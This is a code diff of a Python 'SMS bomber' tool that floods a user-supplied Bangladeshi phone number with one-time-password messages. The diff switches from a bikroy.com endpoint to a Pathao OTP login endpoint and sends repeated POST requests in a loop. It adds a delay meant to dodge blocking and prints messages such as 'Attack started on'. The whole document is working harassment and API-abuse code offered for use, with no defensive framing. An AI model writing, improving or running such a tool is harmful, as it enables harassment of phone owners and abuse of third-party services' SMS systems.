@@ -7,35 +7,46 @@ def banner():
     print("========================================")
     print("        WELCOME TO X-BOOM TOOL          ")
     print("     Created by: mmalekislam788         ")
-    print("     Status: REAL SMS SENDER ACTIVE     ")
+    print("     Status: SMS API UPDATED (2026)     ")
     print("========================================")
 
 def send_sms(target, count):
-    url = "https://bikroy.com/data/is-pno-registered-login"
-    params = {"phone": target}
+    # Pathao API for testing
+    url = "https://api-hermes.pathao.com/user/otp-send/login"
+    
+    # Cleaning the number (removing 88 if added)
+    if target.startswith("01"):
+        phone = "+88" + target
+    else:
+        phone = target
+
+    payload = {"phone": phone}
+    
     print(f"\n[+] Attack started on: {target}")
     for i in range(count):
         try:
-            response = requests.get(url, params=params)
+            # Sending Request
+            response = requests.post(url, json=payload)
             if response.status_code == 200:
                 print(f"[!] SMS {i+1} sent successfully!")
             else:
-                print(f"[?] Failed to send SMS {i+1}")
+                print(f"[?] Failed (Server Busy) SMS {i+1}")
         except:
-            print(f"[-] Error occurred at SMS {i+1}")
+            print(f"[-] Network Error at SMS {i+1}")
+        
+        # 2 seconds gap to avoid getting blocked
         time.sleep(2)
 
 def main():
     banner()
-    print("\n[1] Real SMS Bomber (Bangladesh)")
+    print("\n[1] Start SMS Bomber")
     print("[2] Exit")
     choice = input("\nSelect an option: ")
     if choice == '1':
         number = input("Enter Phone Number (01xxxxxxxxx): ")
-        amount_input = input("Enter SMS Amount: ")
-        amount = int(amount_input)
+        amount = int(input("Enter SMS Amount: "))
         send_sms(number, amount)
-        print("\n[+] Attack Finished!")
+        print("\n[+] Task Completed!")
     else:
         print("Exiting...")
 
